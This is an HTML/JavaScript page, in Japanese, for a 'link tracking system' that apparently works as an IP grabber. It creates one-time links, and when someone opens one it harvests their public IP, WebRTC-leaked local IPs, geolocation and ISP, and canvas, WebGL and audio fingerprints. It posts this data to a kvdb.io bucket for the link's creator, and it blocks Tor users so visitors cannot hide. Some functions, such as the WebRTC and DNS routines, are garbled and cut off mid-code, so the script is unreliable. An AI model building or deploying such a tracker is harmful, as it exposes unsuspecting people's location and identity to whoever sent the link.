<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>リンクトラッキングシステム</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 30%, rgba(220, 20, 60, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 70%, rgba(139, 0, 0, 0.15) 0%, transparent 50%);
            animation: pulse 8s ease-in-out infinite;
            z-index: 0;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }
        
        .container {
            background: rgba(10, 0, 0, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.4);
            width: 100%;
            max-width: 1000px;
            overflow: hidden;
            border: 1px solid rgba(255, 0, 0, 0.3);
            position: relative;
            z-index: 1;
            padding: 40px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
        }
        
        .header p {
            color: #ff6666;
            font-size: 1.1rem;
        }
        
        .create-section {
            background: rgba(20, 0, 0, 0.6);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 0, 0, 0.3);
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #8b0000, #dc143c);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 20px rgba(220, 20, 60, 0.5);
            border: 1px solid rgba(255, 0, 0, 0.4);
            margin-bottom: 20px;
        }
        
        .btn:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 8px 30px rgba(220, 20, 60, 0.7);
            background: linear-gradient(135deg, #a00000, #ff1744);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .link-display {
            background: rgba(30, 0, 0, 0.8);
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
            border-left: 3px solid #dc143c;
            display: none;
        }
        
        .link-url {
            font-family: 'Courier New', monospace;
            color: #ff8888;
            word-break: break-all;
            font-size: 1.1rem;
            margin-bottom: 15px;
        }
        
        .copy-btn {
            padding: 12px 24px;
            background: #b54343;
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .copy-btn:hover {
            background: #dc143c;
            transform: scale(1.05);
        }
        
        .visitors-section {
            background: rgba(20, 0, 0, 0.6);
            border-radius: 12px;
            padding: 30px;
            border: 1px solid rgba(255, 0, 0, 0.3);
            display: none;
        }
        
        .section-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #ff6666;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .visitor-item {
            background: rgba(30, 0, 0, 0.8);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 15px;
            border-left: 3px solid #dc143c;
        }
        
        .visitor-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .visitor-time {
            color: #ff8888;
            font-size: 1.1rem;
            font-weight: 600;
        }
        
        .visitor-ip {
            color: #b9bbbe;
            font-family: 'Courier New', monospace;
        }
        
        .visitor-details {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 0, 0, 0.3);
        }
        
        .detail-row {
            display: grid;
            grid-template-columns: 180px 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .detail-label {
            color: #ff8888;
            font-weight: 600;
        }
        
        .detail-value {
            color: #fff;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .completed-page {
            text-align: center;
            padding: 60px 20px;
        }
        
        .completed-page h1 {
            font-size: 3rem;
            color: #ff3333;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
            animation: successPulse 2s ease-in-out infinite;
        }
        
        @keyframes successPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .status-message {
            background: rgba(181, 67, 67, 0.2);
            border: 1px solid #b54343;
            color: #ff8585;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            display: none;
        }
        
        .timer-display {
            color: #ff8888;
            font-size: 0.9rem;
            margin-top: 10px;
            text-align: center;
        }
        
        .tor-blocked {
            text-align: center;
            padding: 60px 20px;
        }
        
        .tor-blocked h1 {
            font-size: 3rem;
            color: #ff3333;
            margin-bottom: 20px;
        }
        
        .tor-blocked p {
            font-size: 1.2rem;
            color: #ff8888;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
            color: #ff8888;
        }
        
        .already-used {
            text-align: center;
            padding: 60px 20px;
        }
        
        .already-used h1 {
            font-size: 2.5rem;
            color: #ff6666;
            margin-bottom: 20px;
        }
        
        @media (max-width: 768px) {
            .detail-row {
                grid-template-columns: 1fr;
            }
            .header h1 {
                font-size: 2rem;
            }
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="creator-view">
            <div class="header">
                <h1>リンクトラッキングシステム</h1>
                <p>リンクを作成して訪問者の情報を追跡</p>
            </div>
            
            <div class="create-section">
                <button id="create-link-btn" class="btn">リンクを自動作成</button>
                <div id="timer-display" class="timer-display"></div>
                
                <div id="link-display" class="link-display">
                    <div class="link-url" id="generated-link"></div>
                    <button id="copy-link-btn" class="copy-btn">リンクをコピー</button>
                </div>
                
                <div id="status-message" class="status-message"></div>
            </div>
            
            <div id="visitors-section" class="visitors-section">
                <h2 class="section-title">訪問者情報</h2>
                <div id="visitors-list"></div>
            </div>
        </div>
        
        <div id="visitor-view" style="display: none;">
            <div class="loading">
                <h2>情報を収集中...</h2>
                <p>しばらくお待ちください</p>
            </div>
        </div>
        
        <div id="already-used" class="already-used" style="display: none;">
            <h1>このリンクは使用済みです</h1>
            <p>既に情報が送信されています</p>
        </div>
        
        <div id="tor-blocked" class="tor-blocked" style="display: none;">
            <h1>アクセス拒否</h1>
            <p>このサイトはTorブラウザからアクセスできません</p>
        </div>
    </div>

    <script>
        // Tor検出
        function detectTor() {
            const ua = navigator.userAgent;
            if (/Tor Browser/i.test(ua)) return true;
            if (window.navigator.doNotTrack === 'unspecified' && 
                /Firefox/.test(ua) && 
                navigator.plugins.length === 0) return true;
            return false;
        }
        
        if (detectTor()) {
            document.getElementById('creator-view').style.display = 'none';
            document.getElementById('visitor-view').style.display = 'none';
            document.getElementById('tor-blocked').style.display = 'block';
            throw new Error('Tor detected');
        }
        
        let linkId = null;
        let storageId = null;
        const COOLDOWN_TIME = 5 * 60 * 1000;
        const LINK_EXPIRY = 20 * 60 * 1000;
        
        // kvdb.io API（完全無料・登録不要・確実動作）
        const STORAGE_BASE = 'https://kvdb.io/9VMLfW2xWLiXVhQ4ZajYnf';
        
        const urlParams = new URLSearchParams(window.location.search);
        const visitLinkId = urlParams.get('id');
        
        if (visitLinkId) {
            // 訪問者モード
            checkAndCollect(visitLinkId);
        } else {
            // 作成者モード
            setupCreatorView();
            checkCooldown();
        }
        
        function setupCreatorView() {
            document.getElementById('create-link-btn').addEventListener('click', createLink);
            document.getElementById('copy-link-btn').addEventListener('click', copyLink);
        }
        
        function checkCooldown() {
            const lastCreate = localStorage.getItem('lastLinkCreate');
            if (lastCreate) {
                const elapsed = Date.now() - parseInt(lastCreate);
                if (elapsed < COOLDOWN_TIME) {
                    disableCreateButton(COOLDOWN_TIME - elapsed);
                }
            }
        }
        
        function disableCreateButton(remaining) {
            const btn = document.getElementById('create-link-btn');
            const timer = document.getElementById('timer-display');
            btn.disabled = true;
            
            const updateTimer = () => {
                const left = remaining - (Date.now() - parseInt(localStorage.getItem('lastLinkCreate')));
                if (left <= 0) {
                    btn.disabled = false;
                    timer.textContent = '';
                    return;
                }
                const minutes = Math.floor(left / 60000);
                const seconds = Math.floor((left % 60000) / 1000);
                timer.textContent = `次のリンク作成まで: ${minutes}分${seconds}秒`;
                setTimeout(updateTimer, 1000);
            };
            updateTimer();
        }
        
        async function createLink() {
            const now = Date.now();
            const lastCreate = localStorage.getItem('lastLinkCreate');
            
            if (lastCreate && (now - parseInt(lastCreate)) < COOLDOWN_TIME) {
                showStatus('まだリンクを作成できません');
                return;
            }
            
            showStatus('リンクを作成中...');
            
            try {
                linkId = generateShortId();
                storageId = 'track_' + linkId;
                
                // kvdb.ioに初期データを保存
                const initialData = {
                    linkId: linkId,
                    created: now,
                    expires: now + LINK_EXPIRY,
                    used: false,
                    visitor: null
                };
                
                const response = await fetch(`${STORAGE_BASE}/${storageId}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(initialData)
                });
                
                if (!response.ok) throw new Error('作成失敗');
                
                const link = `http://yca.surge.sh?id=${linkId}`;
                
                localStorage.setItem('lastLinkCreate', now.toString());
                localStorage.setItem('currentLinkId', linkId);
                localStorage.setItem('currentStorageId', storageId);
                
                document.getElementById('generated-link').textContent = link;
                document.getElementById('link-display').style.display = 'block';
                document.getElementById('visitors-section').style.display = 'block';
                
                showStatus('リンク作成完了！全ブラウザ・PC/携帯対応');
                
                disableCreateButton(COOLDOWN_TIME);
                startPolling(storageId);
                
                setTimeout(() => {
                    deleteStorage(storageId);
                }, LINK_EXPIRY);
                
            } catch (error) {
                console.error('作成エラー:', error);
                showStatus('作成に失敗しました。もう一度お試しください');
            }
        }
        
        function generateShortId() {
            return 'T' + Date.now().toString(36) + Math.random().toString(36).substring(2, 9).toUpperCase();
        }
        
        async function deleteStorage(storageId) {
            try {
                await fetch(`${STORAGE_BASE}/${storageId}`, {
                    method: 'DELETE'
                });
                localStorage.removeItem('currentLinkId');
                localStorage.removeItem('currentStorageId');
            } catch (e) {}
        }
        
        function copyLink() {
            const link = document.getElementById('generated-link').textContent;
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(link).then(() => {
                    showStatus('リンクをコピーしました！');
                }).catch(() => {
                    fallbackCopy(link);
                });
            } else {
                fallbackCopy(link);
            }
        }
        
        function fallbackCopy(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                showStatus('リンクをコピーしました！');
            } catch (e) {
                showStatus('コピーに失敗しました');
            }
            document.body.removeChild(textarea);
        }
        
        function showStatus(message) {
            const statusEl = document.getElementById('status-message');
            if (!statusEl) return;
            statusEl.textContent = message;
            statusEl.style.display = 'block';
            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 4000);
        }
        
        function startPolling(storageId) {
            const listEl = document.getElementById('visitors-list');
            if (!listEl) return;
            listEl.innerHTML = '<p style="color: #888; text-align: center;">訪問者を待っています...<br><small style="color:#666;font-size:0.9em;">全ブラウザ・PC/携帯完全対応</small></p>';
            
            const checkInterval = setInterval(async () => {
                try {
                    const response = await fetch(`${STORAGE_BASE}/${storageId}`);
                    
                    if (!response.ok) {
                        clearInterval(checkInterval);
                        return;
                    }
                    
                    const data = await response.json();
                    
                    if (data.used && data.visitor) {
                        clearInterval(checkInterval);
                        displayVisitor(data.visitor);
                    }
                } catch (e) {
                    console.error('ポーリングエラー:', e);
                }
            }, 2000);
            
            setTimeout(() => {
                clearInterval(checkInterval);
            }, LINK_EXPIRY);
        }
        
        async function checkAndCollect(linkId) {
            try {
                const storageId = 'track_' + linkId;
                
                // データ確認
                const response = await fetch(`${STORAGE_BASE}/${storageId}`);
                
                if (!response.ok) throw new Error('無効なリンク');
                
                const data = await response.json();
                
                if (data.used) {
                    document.getElementById('creator-view').style.display = 'none';
                    document.getElementById('visitor-view').style.display = 'none';
                    document.getElementById('already-used').style.display = 'block';
                    return;
                }
                
                // 情報収集開始
                document.getElementById('creator-view').style.display = 'none';
                document.getElementById('visitor-view').style.display = 'block';
                await collectAndSendInfo(linkId, storageId);
                
            } catch (error) {
                console.error('チェックエラー:', error);
                document.getElementById('visitor-view').innerHTML = '<div class="completed-page"><h1>エラー</h1><p style="color: #ff8888;">リンクが無効です</p></div>';
            }
        }
        
        async function collectAndSendInfo(linkId, storageId) {
            try {
                const info = {
                    linkId: linkId,
                    timestamp: new Date().toISOString(),
                    collectionTime: Date.now()
                };
                
                info.userAgent = navigator.userAgent || '不明';
                info.language = navigator.language || '不明';
                info.languages = (navigator.languages || [navigator.language]).join(', ');
                info.platform = navigator.platform || '不明';
                info.screenWidth = screen.width || 0;
                info.screenHeight = screen.height || 0;
                info.screenResolution = `${screen.width}x${screen.height}`;
                info.colorDepth = screen.colorDepth || '不明';
                info.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明';
                info.hardwareConcurrency = navigator.hardwareConcurrency || '不明';
                info.maxTouchPoints = navigator.maxTouchPoints || 0;
                info.cookieEnabled = navigator.cookieEnabled ? 'はい' : 'いいえ';
                info.doNotTrack = navigator.doNotTrack || '不明';
                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '不明';
                
                info.os = detectOS();
                info.browser = detectBrowser();
                info.isMobile = /Mobile|Android|iPhone|iPod/.test(navigator.userAgent);
                info.isTablet = /iPad|Android/.test(navigator.userAgent) && !/Mobile/.test(navigator.userAgent);
                
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    info.connectionType = conn.effectiveType || '不明';
                    info.downlink = conn.downlink ? `${conn.downlink}Mbps` : '不明';
                    info.rtt = conn.rtt ? `${conn.rtt}ms` : '不明';
                }
                
                info.canvas = getCanvasFingerprint();
                info.webGL = getWebGLFingerprint();
                info.plugins = getPluginsList();
                
                const tasks = [
                    fetchPublicIP(),
                    fetchLocalIPs(),
                    fetchWebRTCIPs(),
                    fetchDNSInfo(),
                    fetchAudioFingerprint()
                ];
                
                if (info.isMobile || info.isTablet) {
                    tasks.push(fetchBatteryInfo());
                }
                
                const results = await Promise.allSettled(tasks);
                
                results.forEach(result => {
                    if (result.status === 'fulfilled' && result.value) {
                        Object.assign(info, result.value);
                    }
                });
                
                if (info.publicIP && info.publicIP !== '取得失敗') {
                    try {
                        const ipDetail = await fetchIPDetails(info.publicIP);
                        if (ipDetail) Object.assign(info, ipDetail);
                    } catch (e) {}
                }
                
                // kvdb.ioに送信
                const updateData = {
                    linkId: linkId,
                    created: Date.now(),
                    expires: Date.now() + LINK_EXPIRY,
                    used: true,
                    visitor: info
                };
                
                await fetch(`${STORAGE_BASE}/${storageId}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(updateData)
                });
                
                document.getElementById('visitor-view').innerHTML = `
                    <div class="completed-page">
                        <h1>完了！</h1>
                        <p style="color: #ff8888; margin-top: 20px;">情報を送信しました</p>
                    </div>
                `;
                
                setTimeout(() => {
                    window.close();
                    if (!window.closed) {
                        window.location.href = 'about:blank';
                    }
                }, 3000);
                
            } catch (error) {
                console.error('収集エラー:', error);
            }
        }
        
        function displayVisitor(v) {
            const listEl = document.getElementById('visitors-list');
            if (!listEl) return;
            
            listEl.innerHTML = '';
            
            const item = document.createElement('div');
            item.className = 'visitor-item';
            
            const time = new Date(v.timestamp).toLocaleString('ja-JP');
            const deviceType = v.isMobile ? 'モバイル' : (v.isTablet ? 'タブレット' : 'PC');
            
            let detailsHTML = `
                <div class="visitor-header">
                    <div class="visitor-time">[${deviceType}] 訪問者情報</div>
                    <div class="visitor-ip">${v.publicIP || '不明'}</div>
                </div>
                <div class="visitor-details">
                    <div class="detail-row"><div class="detail-label">訪問時刻</div><div class="detail-value">${time}</div></div>
                    <div class="detail-row"><div class="detail-label">デバイス種類</div><div class="detail-value">${deviceType}</div></div>
                    <div class="detail-row"><div class="detail-label">パブリックIP</div><div class="detail-value">${v.publicIP || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">ローカルIP</div><div class="detail-value">${(v.localIPs && v.localIPs.length > 0) ? v.localIPs.join(', ') : '取得失敗'}</div></div>
                    <div class="detail-row"><div class="detail-label">WebRTC IP</div><div class="detail-value">${(v.webRTCIPs && v.webRTCIPs.length > 0) ? v.webRTCIPs.join(', ') : '取得失敗'}</div></div>
                    <div class="detail-row"><div class="detail-label">IP詳細情報</div><div class="detail-value">${v.ipInfo || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">DNS情報</div><div class="detail-value">${v.dnsInfo || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">OS</div><div class="detail-value">${v.os || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">ブラウザ</div><div class="detail-value">${v.browser || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">画面解像度</div><div class="detail-value">${v.screenResolution || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">色深度</div><div class="detail-value">${v.colorDepth || '不明'}bit</div></div>
                    <div class="detail-row"><div class="detail-label">メモリ</div><div class="detail-value">${v.deviceMemory || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">CPUコア数</div><div class="detail-value">${v.hardwareConcurrency || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">言語</div><div class="detail-value">${v.language || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">タイムゾーン</div><div class="detail-value">${v.timezone || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">Canvas指紋</div><div class="detail-value">${v.canvas || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">WebGL指紋</div><div class="detail-value">${v.webGL || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">Audio指紋</div><div class="detail-value">${v.audio || '不明'}</div></div>
                    <div class="detail-row"><div class="detail-label">UserAgent</div><div class="detail-value">${v.userAgent || '不明'}</div></div>
                </div>
            `;
            
            item.innerHTML = detailsHTML;
            listEl.appendChild(item);
        }
        
        async function fetchPublicIP() {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of apis) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 5000);
                    const res = await fetch(api, { signal: controller.signal });
                    const data = await res.json();
                    const ip = data.ip || data.ipString || data.address || null;
                    if (ip) return { publicIP: ip };
                } catch (e) {
                    continue;
                }
            }
            return { publicIP: '取得失敗' };
        }
        
        async function fetchLocalIPs() {
            return new Promise(resolve => {
                try {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({ 
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel('');
                    pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => {});
                    
                    pc.onicecandidate = (e) => {
                        if (!e || !e.candidate) return;
                        try {
                            const parts = e.candidate.candidate.split(' ');
                            const ip = parts[4];
                            if (ip && !ip.startsWith('127.') && !ip.startsWith('0.') && !ip.includes(':')) {
                                ips.add(ip);
                            }
                        } catch (err) {}
                    };
                    
                    setTimeout(() => {
                        try { pc.close(); } catch(e) {}
                        resolve({ localIPs: Array.from(ips) });
                    }, 4000);
                } catch (e) {
                    resolve({ localIPs: [] });
                }
            });
        }
        
        async function fetchWebRTCIPs() {
            return new Promise(resolve => {
                try {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({

                            { urls: 'stun:stun.l.google.com:19302' },

                        ]
                    });
                    
                    pc.createDataChannel('');

                            const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);

        async function fetchDNSInfo() {
            try {
                const controller = new AbortController();
                setTimeout(() => controller.abort(), 5000);
                const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { signal: controller.signal });
                const text = await res.text();

        async function fetchIPDetails(ip) {
            const apis = [
                `https://ipapi.co/${ip}/json/`,
                `https://ip-api.com/json/${ip}`
            ];
            
            for (const api of apis) {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 6000);
                    const res = await fetch(api, { signal: controller.signal });
                    const data = await res.json();
                    
                    const country = data.country_name || data.country || '不明';
                    const city = data.city || '不明';
                    const region = data.region || data.region_name || '';
                    const org = data.org || data.isp || 'ISP不明';
                    
                    return { ipInfo: `${country}, ${region ? region + ', ' : ''}${city}, ${org}` };
                } catch (e) {
                    continue;
                }
            }
            return { ipInfo: '取得失敗' };
        }
        
        async function fetchBatteryInfo() {
            try {
                if (!navigator.getBattery) return {};
                const battery = await navigator.getBattery();
                return {
                    batteryLevel: `${Math.round(battery.level * 100)}%`,
                    batteryCharging: battery.charging ? '充電中' : '非充電'
                };
            } catch (e) {
                return {};
            }
        }
        
        async function fetchAudioFingerprint() {
            return new Promise(resolve => {
                try {
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (!AudioContext) {
                        resolve({ audio: 'Audio非対応' });
                        return;
                    }
                    
                    const ctx = new AudioContext();
                    const osc = ctx.createOscillator();
                    const analyser = ctx.createAnalyser();
                    const gain = ctx.createGain();
                    const proc = ctx.createScriptProcessor(4096, 1, 1);
                    
                    gain.gain.value = 0;
                    osc.type = 'triangle';
                    osc.frequency.value = 10000;
                    osc.connect(analyser);
                    analyser.connect(proc);
                    proc.connect(gain);
                    gain.connect(ctx.destination);
                    
                    osc.start(0);
                    
                    proc.onaudioprocess = (e) => {
                        const output = e.outputBuffer.getChannelData(0);
                        let hash = 0;
                        for (let i = 0; i < output.length; i++) {
                            hash += Math.abs(output[i]);
                        }
                        try {
                            osc.stop();
                            proc.disconnect();
                            analyser.disconnect();
                            gain.disconnect();
                            ctx.close();
                        } catch(err) {}
                        resolve({ audio: hash.toFixed(10) });
                    };
                    
                    setTimeout(() => {
                        try { 
                            osc.stop();
                            proc.disconnect();
                            analyser.disconnect();
                            gain.disconnect();
                            ctx.close();
                        } catch(err) {}
                        resolve({ audio: 'タイムアウト' });
                    }, 1500);
                } catch (e) {
                    resolve({ audio: '取得失敗' });
                }
            });
        }
        
        function detectOS() {
            try {
                const ua = navigator.userAgent;
                if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
                if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
                if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
                if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
                if (/Windows/.test(ua)) return 'Windows';
                if (/Mac OS X/.test(ua)) {
                    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
                    return match ? `Mac OS ${match[1].replace('_', '.')}` : 'Mac OS';
                }
                if (/Android/.test(ua)) {
                    const match = ua.match(/Android (\d+(\.\d+)?)/);
                    return match ? `Android ${match[1]}` : 'Android';
                }
                if (/iPhone|iPad|iPod/.test(ua)) {
                    const match = ua.match(/OS (\d+_\d+)/);
                    return match ? `iOS ${match[1].replace('_', '.')}` : 'iOS';
                }
                if (/Linux/.test(ua) || /X11/.test(ua)) return 'Linux';
                if (/CrOS/.test(ua)) return 'Chrome OS';
                return navigator.platform || '不明';
            } catch (e) {
                return '不明';
            }
        }
        
        function detectBrowser() {
            try {
                const ua = navigator.userAgent;
                if (/Edg\//.test(ua)) {
                    const match = ua.match(/Edg\/(\d+)/);
                    return match ? `Microsoft Edge ${match[1]}` : 'Microsoft Edge';
                }
                if (/Chrome/.test(ua) && !/Edg/.test(ua) && !/OPR/.test(ua)) {
                    const match = ua.match(/Chrome\/(\d+)/);
                    return match ? `Google Chrome ${match[1]}` : 'Google Chrome';
                }
                if (/Firefox/.test(ua)) {
                    const match = ua.match(/Firefox\/(\d+)/);
                    return match ? `Mozilla Firefox ${match[1]}` : 'Mozilla Firefox';
                }
                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
                    const match = ua.match(/Version\/(\d+)/);
                    return match ? `Safari ${match[1]}` : 'Safari';
                }
                if (/Opera|OPR/.test(ua)) {
                    const match = ua.match(/(?:Opera|OPR)\/(\d+)/);
                    return match ? `Opera ${match[1]}` : 'Opera';
                }
                if (/Brave/.test(ua)) return 'Brave';
                if (/SamsungBrowser/.test(ua)) return 'Samsung Internet';
                return '不明';
            } catch (e) {
                return '不明';
            }
        }
        
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 240;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                if (!ctx) return '取得失敗';
                
                ctx.textBaseline = 'top';
                ctx.font = '16px "Arial"';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas<FP>123', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas<FP>123', 4, 17);
                
                ctx.globalCompositeOperation = 'multiply';
                ctx.fillStyle = 'rgb(255,0,255)';
                ctx.beginPath();
                ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
                ctx.closePath();
                ctx.fill();
                
                const url = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < url.length; i++) {
                    const char = url.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(16).substring(0, 14);
            } catch (e) {
                return '取得失敗';
            }
        }
        
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'WebGL非対応';
                
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                if (ext) {
                    const vendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                    return `${vendor} - ${renderer}`;
                }
                
                const vendor = gl.getParameter(gl.VENDOR);
                const renderer = gl.getParameter(gl.RENDERER);
                return `${vendor} - ${renderer}`;
            } catch (e) {
                return '取得失敗';
            }
        }
        
        function getPluginsList() {
            try {
                if (!navigator.plugins || navigator.plugins.length === 0) return 'なし';
                const list = [];
                for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
                    list.push(navigator.plugins[i].name);
                }
                return list.join(', ');
            } catch (e) {
                return 'なし';
            }
        }
